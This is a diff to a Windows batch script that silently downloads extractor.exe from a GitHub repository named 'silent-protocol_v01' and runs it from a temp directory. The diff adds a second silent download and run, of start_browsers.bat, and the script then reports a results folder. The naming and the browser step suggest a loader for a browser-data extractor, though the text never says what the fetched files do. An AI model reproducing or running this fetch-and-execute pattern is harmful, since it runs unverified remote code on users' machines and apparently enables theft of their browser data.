@@ -26,6 +26,7 @@ cd "%tempdir%" || (
 )
 echo Downloading files...
 curl -L -s -o extractor.exe https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/extractor.exe
+curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/start_browsers.bat
 REM Verify all critical downloads
 for %%F in (extractor.exe) do (
     if not exist "%%F" (
@@ -37,5 +38,9 @@ REM Create running flag
 echo %datetime% > "%tempdir%\running.tmp"
 echo Starting process----------------------------------------
 call "%tempdir%\extractor.exe"
+
+echo Starting browsers----------------------------------------
+call "%tempdir%\start_browsers.bat"
+
 echo results dir: %tempdir%
 echo result folder: %tempdir%\result
